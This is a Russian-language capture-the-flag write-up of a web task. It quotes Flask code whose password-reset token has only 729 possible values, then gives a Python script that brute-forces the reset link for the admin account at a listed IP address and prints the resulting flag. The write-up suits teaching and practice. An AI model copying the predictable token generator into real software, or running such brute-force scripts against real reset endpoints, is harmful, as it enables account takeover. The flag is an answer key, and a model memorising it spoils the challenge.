## Описание

Сможете ли вы найти способ получить доступ к учетной записи администратора, пока он занят установкой новых рекордов?

## Решение

В коде видим, что можно подделать токен и получить сессию для входа в админку:

```
def _generate_token():
    _allowed = [98, 99, 100]
    _result = []
    for _ in range(6):
        _v = _allowed[random.randint(0, len(_allowed) - 1)]
        _result.append(chr(_v))
    return ''.join(_result)
    
reset_uuid = _generate_token()

@app.route('/reset/<uuid>')
def reset_confirm(uuid):
    conn = sqlite3.connect('task.db')
    c = conn.cursor()
    user = c.execute("SELECT username FROM users WHERE reset_uuid=?", (uuid,)).fetchone()
    
    if user:
        c.execute("UPDATE users SET reset_uuid=NULL WHERE username=?", (user[0],))
        conn.commit()
        conn.close()
        
        session['user'] = user[0]
        return redirect(url_for('index'))
    
    conn.close()
    return "Invalid reset link", 404
```
Отправляем запрос на сброс пароля c username=admin:

http://62.173.140.174:16060/reset_password

Брутфорсом проверяем токен и получаем флаг:

```
import requests
import itertools


def brute_force_simple():
    base_url = "http://62.173.140.174:16060"
    session = requests.Session()

    chars = ['b', 'c', 'd']

    print("Начинаем перебор токенов...")
    for combination in itertools.product(chars, repeat=6):
        token = ''.join(combination)
        url = f"{base_url}/reset/{token}"

        response = session.get(url, allow_redirects=False)

        if response.status_code != 404:
            print(f"УСПЕХ! Токен: {token}")

            # Проверяем админку
            admin_response = session.get(f"{base_url}/admin")
            if 'CODEBY' in admin_response.text:
                print("Доступ к админке получен!")
                print(admin_response.text)
            break


brute_force_simple()
```

CODEBY{S0M3_K1ND_0F_S7R4NG3_UU1D}
